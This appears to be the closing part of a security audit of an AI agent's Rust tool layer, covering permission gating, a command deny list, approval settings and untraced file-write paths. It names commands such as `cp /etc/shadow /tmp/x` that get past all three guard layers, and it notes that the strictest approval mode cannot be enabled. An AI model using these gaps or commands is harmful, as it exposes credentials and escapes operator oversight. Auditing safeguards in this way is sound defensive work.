Recommendation: when it is wired, add `tts` to `is_permission_gated_tool` (or, better, keep command providers config-only and document the template as trusted). Until then, note in the module header that the template is the trust boundary — a future editor who assumes the *value* escaping makes it safe would be wrong.

**Files newly read for this pass:** `tts_command_provider.rs` (all 175), `tts_tool.rs` :1-175 + :795, `tts_registry.rs` :1-80, `checkpoint_tool.rs` (grep), `working_diff_tool.rs` (grep), `debug_helpers.rs` (grep), `cli_discovery.rs` (grep), `config.rs` :2433-2449.

---

## Summary

Two HIGH findings, both about **reachability of the strongest guard**:

- **B1** — the blast-radius deny list is real but keyed on a 7-verb table. `mv /etc /tmp/x`, `cp /etc/shadow /tmp/x`, `rsync -a /etc/ /tmp/x` are **allowed** by all three layers.
- **B2** — `approval_mode` cannot be set from config. `"manual"` (approve every tool) is unreachable; `"off"` is silently ignored.

Both are the same species: a safety mechanism that exists, is documented, is tested — and is not on the path an operator or a model actually takes. The socket/approval and name-recovery suspicions did **not** hold up (B9); the seam is better wired there than the audit brief assumed. Biggest ponytail win: delete the 1966-LOC duplicate classifier in `operant-config` and derive `builtin_tool_names()` from the registration table.

**Validation result (12 findings, one added post-completion):** the mechanical sweep over all 66 tool bodies found exactly 8 process-spawning tools and **no unguarded shell path from the model**. The one new shell site (`tts_command_provider.rs:138`) is dead code with sound value-escaping; its template is the trust boundary, and it is config-authored. The "capability half" gap I flagged is now closed for process execution. It is **not** closed for filesystem writes: 12 tool bodies write/delete files, and I read only `file_tools.rs`/`patch_tool.rs`/`aft_tools.rs` — `skills_tool.rs` (11 write sites) and `todo_tool.rs` (2) were not traced, and `skills_tool` writes into skill roots the model can influence. That is the next place to look.